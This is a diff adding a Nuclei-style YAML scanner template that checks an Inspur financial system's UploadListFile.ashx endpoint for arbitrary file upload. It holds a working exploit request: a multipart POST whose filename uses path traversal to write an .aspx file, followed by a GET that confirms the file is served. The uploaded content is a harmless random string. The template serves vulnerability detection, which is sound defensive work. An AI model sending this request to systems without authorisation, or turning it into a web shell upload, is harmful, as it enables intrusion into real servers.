@@ -1,0 +1,44 @@
+id: inspur-uploadlistfile-anyfile-upload
+info:
+  name: Inspur Financial System UploadListFile Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  random_string: "{{rand_base(4)}}"
+  encoded_content: "{{base64(random_string)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1"
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------rww5upkbw6ctf0tu5hye
+    body: |-
+      -----------------------------rww5upkbw6ctf0tu5hye
+      Content-Disposition: form-data; name="file"; filename="../../../../../../{{random_string}}.aspx"
+      Content-Type: image/png
+
+      {{encoded_content}}
+      -----------------------------rww5upkbw6ctf0tu5hye--
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'jsonrpc')"
+          - "contains(body, '.aspx')"
+          - "!contains(body, '<')"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/cwbase/{{random_string}}.aspx"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "body == encoded_content"
